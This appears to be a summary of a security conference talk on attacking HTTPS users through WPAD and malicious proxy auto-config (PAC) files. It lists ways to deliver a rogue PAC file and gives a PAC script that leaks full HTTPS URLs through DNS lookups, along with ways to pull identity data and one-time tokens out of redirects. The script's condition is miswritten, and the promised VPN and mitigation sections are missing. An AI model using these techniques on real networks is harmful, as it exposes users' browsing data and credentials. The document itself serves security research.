# Toxic Proxies: Bypassing HTTPS and VPNs to Compromise Your Online Identity

**Presenters:**
- Alex Chapman (@noxrnet)
- Paul Stone (@pdjstone)

## Introduction
In this presentation, we will explore advanced techniques for bypassing HTTPS and VPNs, allowing attackers to compromise your online identity. We will cover the following topics:
- A brief history of SSL, PAC, WPAD, sslstrip, and HSTS.
- The PAC Attack: How to bypass HTTPS and steal sensitive data.
- The VPN Attack: How to bypass VPNs.
- Mitigations and fixes.

## Historical Context
### No Encryption (1993)
Initially, there was no encryption for web traffic. This lack of security was a significant vulnerability.

### SSL (1995)
Netscape 2 introduced SSL in 1995, providing opt-in encryption and certificates to verify domain ownership. This made users somewhat safe from passive traffic sniffing attacks.

### SSL Limitations
Despite SSL, many websites allowed connections over both HTTP and HTTPS. Users often connected via HTTP first, and then the site redirected to HTTPS. An evil man-in-the-middle (MITM) could prevent users from reaching the HTTPS site.

### sslstrip (2009)
sslstrip, released in 2009, exploited these vulnerabilities by:
- Acting as an MITM HTTP proxy.
- Removing redirects to HTTPS.
- Rewriting HTTPS links to HTTP.
- Fetching HTTPS-only pages and serving them as HTTP.
- Ensuring the user never reached the real HTTPS site.

### HSTS (2010)
HSTS (HTTP Strict Transport Security) was introduced to force browsers to always use HTTPS. This mitigated the vulnerabilities exploited by sslstrip.

### Present Day
HSTS is now widely adopted, with most major websites (Google, Facebook, Twitter, etc.) using it. However, new attack vectors have emerged.

## Proxy Auto-Config (PAC)
### Problem
Complex intranets require different HTTP proxies for different websites, such as:
- `proxyA.initech.corp` for most intranet sites.
- `proxyB.initech.corp` for access to preprod sites.
- `proxyC.initech.corp` for public internet access.

### Solution
PAC files are JavaScript files that tell the browser which proxy to use for each URL. This format was introduced in March 1996.

## Web Proxy Auto-Discovery Protocol (WPAD)
### Problem
Browsers need to automatically get proxy configuration from the network.

### Solution
WPAD allows the browser/OS to automatically retrieve proxy configuration. This protocol was introduced in December 1999.

### WPAD Attacks
WPAD is a significant attack vector. Malicious network users can respond to WPAD requests, hijack traffic, and view or modify clear-text traffic. They can also inject browser 0-days and use sslstrip. Some remote WPAD attacks are possible.

### Delivering a Malicious PAC File
- **DHCP Option 252**: Pushes a malicious URL.
- **DNS Request**: Requests for `wpad.searchdomain`.
- **DNS Response**: Provides a malicious host.
- **LLMNR Response**: Provides a malicious host.

### New PAC Attacks
#### How Does a PAC Script Work?
A typical PAC script:
```javascript
function FindProxyForURL(url, host) {
  if (host.indexOf('preprod.initech.corp') >= 0)
    return 'proxyB.initech.corp';
  else if (host.indexOf('initech.corp') >= 0)
    return 'proxyA.initech.corp';
  else
    return 'proxyC.initech.corp';
}
```

#### PAC Functions
PAC files can use various functions, including:
- `alert`
- `dateRange`
- `dnsDomainIs`
- `dnsDomainLevels`
- `dnsResolve`
- `isInNet`
- `isPlainHostName`
- `isResolvable`
- `localHostOrDomainIs`
- `myIpAddress`
- `shExpMatch`
- `timeRange`
- `weekdayRange`

#### PAC - DNS Leak
By removing or encoding special characters in URLs, attackers can leak data over DNS:
```javascript
function FindProxyForURL(url, host) {
  if (url.indexOf('https' == 0)) {
    var leakUrl = (url + '.leak').replace(/[^\w]+/gi, '.');
    dnsResolve(leakUrl);
  }
  return 'DIRECT';
}
```

### Active Attacks
#### Challenge
Steal as much sensitive data as possible using only URLs, including path and query string, but not HTTP POST bodies, cookies, headers, or HTTP response bodies.

#### 302 Redirects
Leak sensitive data via redirects from known to unknown URLs:
- `https://plus.google.com/me/posts` -> `https://plus.google.com//posts` (or `accounts.google.com` if not logged in).
- `https://www.reddit.com/user/me` -> `https://www.reddit.com/user/` (or `reddit.com/login` if not logged in).

Inject known URLs via hidden image tags to leak data via DNS.

#### Blocking URLs
Some redirects contain one-time auth tokens. To use these on the attacker's side, prevent them from loading in the victim's browser.

## Conclusion
While HSTS and other security measures have improved web security, new attack vectors like PAC and WPAD still pose significant risks. Understanding these threats and implementing appropriate mitigations is crucial for maintaining online security.